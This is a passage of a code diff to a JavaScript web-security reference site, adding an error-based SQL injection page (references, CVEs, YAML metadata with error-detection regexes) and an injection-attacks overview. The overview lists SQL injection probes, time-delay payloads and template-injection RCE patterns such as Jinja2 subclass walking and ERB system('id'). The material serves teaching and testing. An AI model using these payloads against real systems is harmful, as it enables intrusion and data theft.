+- [sqlmap Error-Based Payloads XML](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/error_based.xml)
+- [sqlmap SQL Injection Techniques -- DeepWiki](https://deepwiki.com/sqlmapproject/sqlmap/3-sql-injection-techniques)
+- [Ghauri -- Advanced SQL Injection Tool](https://github.com/r0oth3x49/ghauri)
+
+### Academic Papers
+
+- Lin, H. et al. (2024) "SQL Injection Attack Detection Based on Error Code Knowledge." Proceedings IoTCIT 2023. [Springer](https://doi.org/10.1007/978-981-97-2757-5_50) -- 97.34% detection accuracy using error code knowledge base
+- "SQL injection attack: Detection, prioritization & prevention" (2024). [ScienceDirect](https://www.sciencedirect.com/science/article/pii/S221421262400173X)
+
+### Conference Talks
+
+- [DEF CON 17 -- Joe McCray: Advanced SQL Injection](https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf)
+- [Black Hat USA 2005 -- Esteban Martinez Fayo: Advanced SQL Injection in Oracle](https://blackhat.com/presentations/bh-usa-05/bh-us-05-fayo.pdf)
+- [Black Hat USA 2012 -- Sumit Siddharth: The Art of Exploiting SQL Injection](https://www.blackhat.com/html/bh-us-12/training/courses/bh-us-12-training_exploiting-sql-injection.html)
+- [Ground Zero Summit 2016 -- Osanda Malith: SQL Injection in INSERT/UPDATE/DELETE](https://www.exploit-db.com/docs/33253)
+
+### Bug Bounty Writeups
+
+- [HackerOne #227102 -- U.S. DoD Error-Based SQLi](https://hackerone.com/reports/227102)
+- [HackerOne #2646493 -- Django CVE-2024-42005](https://hackerone.com/reports/2646493)
+- [XPATH Error-Based Injection -- Krunal Savaliya](https://sklnhunt.github.io/posts/xpathinjectionerrorbased/)
+- [Turning Blind Error-Based SQLi to Boolean (MySQL) -- Ozgur Alp](https://ozguralp.medium.com/turning-blind-error-based-sql-injection-into-exploitable-boolean-one-part-2-mysql-ecf1dbe5352f)
+- [Turning Blind Error-Based SQLi to Boolean (MSSQL) -- Ozgur Alp](https://ozguralp.medium.com/turning-blind-error-based-sql-injection-into-an-exploitable-boolean-one-85d6be3ca23b)
+- [Error-Based SQLi with ExtractValue -- FMI/Bagas](https://medium.com/fmisec/sql-injection-error-based-with-extractvalue-68ad9d809d64)
+- [Error-Based SQLi Challenges -- Islam Meshrif](https://islammeshriff.medium.com/error-based-sql-injection-challenges-ed2001801117)
+
+### CVEs
+
+- [CVE-2024-42005 -- Django JSONField (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2024-42005)
+- [CVE-2023-48788 -- FortiClient EMS (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2023-48788)
+- [CVE-2023-34362 -- MOVEit Transfer (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2023-34362)
+- [CVE-2024-8529 -- LearnPress (CVSS 10.0 Wordfence)](https://nvd.nist.gov/vuln/detail/CVE-2024-8529)
+- [CVE-2024-21514 -- OpenCart Divido (CVSS 8.1)](https://nvd.nist.gov/vuln/detail/CVE-2024-21514)
+- [CVE-2023-6360 -- My Calendar (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2023-6360)
+- [CVE-2024-2879 -- LayerSlider (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2024-2879)
+- [CVE-2024-1071 -- Ultimate Member (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2024-1071)
+- [CVE-2024-23119 -- Centreon Web (CVSS 8.8)](https://nvd.nist.gov/vuln/detail/CVE-2024-23119)
+
+---
+
+## AI Agent Metadata
+
+\`\`\`yaml
+id: WEB-CAT01-SQLi-ErrorBased
+type: vulnerability
+category: CAT-01 Injection Attacks
+subcategory: SQL Injection
+variant: Error-Based
+severity: CRITICAL
+cvss_base: 9.8
+cwe:
+  - CWE-89   # SQL Injection (root cause)
+  - CWE-209  # Error Message Information Disclosure (enabling condition)
+capec:
+  - CAPEC-7   # Blind SQL Injection (error oracle variant)
+owasp:
+  - A05:2025  # Security Misconfiguration (verbose errors)
+  - A03:2021  # Injection
+attack_vector: Network
+authentication_required: false (typical)
+user_interaction: None
+sub_techniques:
+  - direct_error_extraction    # Data visible IN the error message
+  - conditional_error_oracle   # Error/no-error as boolean signal
+databases_covered:
+  - MySQL (15 error functions)
+  - MSSQL (8 error functions)
+  - PostgreSQL (6 error functions)
+  - Oracle (9 error functions)
+  - SQLite (5 conditional error functions)
+total_error_functions: 43
+total_payloads: 100+
+waf_bypass_techniques: 20
+cves_documented: 9
+writeups_documented: 7
+talks_documented: 4
+breaches_documented: 2
+primary_tools:
+  - sqlmap (--technique=E)
+  - Burp Suite (Repeater + Intruder)
+  - Ghauri
+detection_regex:
+  mysql: "/XPATH syntax error: '(.+?)'/; /Duplicate entry '(.+?)' for key/; /BIGINT value is out of range/; /Malformed GTID set specification '(.+?)'/; /DOUBLE value is out of range/"
+  mssql: "/Conversion failed when converting the (?:n?varchar|ntext) value '(.+?)' to data type int/"
+  postgresql: "/ERROR: invalid input syntax for (?:type )?(?:integer|numeric): \\"(.+?)\\"/; /ERROR: division by zero/"
+  oracle: "/LPX-\\\\d+: namespace prefix \\"(.+?)\\" is not declared/; /ORA-292257: host (.+?) unknown/; /DRG-11701: thesaurus (.+?) does not exist/"
+  sqlite: "/integer overflow/; /not authorized/; /malformed JSON/"
+related_pages:
+  - 01-Classic-In-Band.md
+  - 03-Union-Based.md
+  - 04-Boolean-Based-Blind.md
+  - 05-Time-Based-Blind.md
+\`\`\`
+`;
+
 CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";
 
 
@@ -3306,6 +5205,7 @@ var SUBTYPE_ROUTES = {
 var SUBTYPE_CHILDREN = {
   'cat-01:SQL Injection': [
     {name: 'Classic / In-Band', slug: 'sqli-classic-inband', done: true},
+    {name: 'Error-Based', slug: 'sqli-error-based', done: true},
     {name: 'Boolean-Based Blind', slug: 'sqli-blind-boolean', done: true}
   ]
 };
@@ -3459,6 +5359,7 @@ function renderPage(hash) {
   else if (hash === 'tools') { document.title = 'GORGE | Tools Index'; renderMarkdownPage(PAGES.tools); }
   else if (hash === 'labs') { document.title = 'GORGE | Lab Environments'; renderMarkdownPage(PAGES.labs); }
   else if (hash === 'sqli-classic-inband') { document.title = 'GORGE | Classic In-Band SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Classic / In-Band SQLi', PAGES.sqli_classic_inband); }
+  else if (hash === 'sqli-error-based') { document.title = 'GORGE | Error-Based SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Error-Based SQLi', PAGES.sqli_error_based); }
   else if (hash === 'sqli-blind-boolean') { document.title = 'GORGE | Boolean-Based Blind SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Boolean-Based Blind SQLi', PAGES.sqli_blind_boolean); }
   else {
     var cat = findCategory(hash);
